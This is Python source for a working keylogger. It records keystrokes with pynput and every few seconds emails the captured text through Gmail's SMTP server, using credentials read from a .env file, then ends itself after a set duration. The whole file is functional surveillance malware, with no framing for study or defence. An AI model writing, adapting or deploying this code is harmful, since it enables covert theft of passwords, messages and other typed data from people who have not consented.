import smtplib
import pynput.keyboard
import threading
import time
import os
import signal
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Access the environment variables
email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')

class Keylogger:
    def __init__(self, email, password, report_interval=60, run_duration=120):
        self.log = "KeyLogger Started !!!!"  # Initial log message
        self.email = email
        self.password = password
        self.report_interval = report_interval
        self.run_duration = run_duration
        self.stop_event = threading.Event()
        self.lock = threading.Lock()  # Lock for thread safety

    def append_log(self, string):
        with self.lock:
            self.log += string

    def keypress(self, key):
        try:
            if key.char.isalnum() or key.char.isspace():
                self.append_log(key.char)
            if key == pynput.keyboard.Key.enter:
                self.append_log(' ')
        except AttributeError:
            pass

    def report(self):
        while not self.stop_event.is_set():
            with self.lock:
                current_log = self.log
                self.log = ""  # Clear the log for the next report
            self.send_mail(self.email, self.password, "\n\n" + current_log)  # Send email with current log
            time.sleep(self.report_interval)  # Send email every report_interval seconds

    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except smtplib.SMTPAuthenticationError as e:
            print(f"Failed to send email: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

    def start(self):
        listener = pynput.keyboard.Listener(on_press=self.keypress)
        listener.start()
        report_thread = threading.Thread(target=self.report)
        report_thread.start()
        self.stop_event.wait(self.run_duration)  # Wait for the specified duration
        self.stop_event.set()  # Set stop event to stop reporting
        os.kill(os.getpid(), signal.SIGTERM)  # Terminate the program

if __name__ == "__main__":
    keylogger = Keylogger(email, password, report_interval=15, run_duration=120)  # Customize intervals if needed
    keylogger.start()
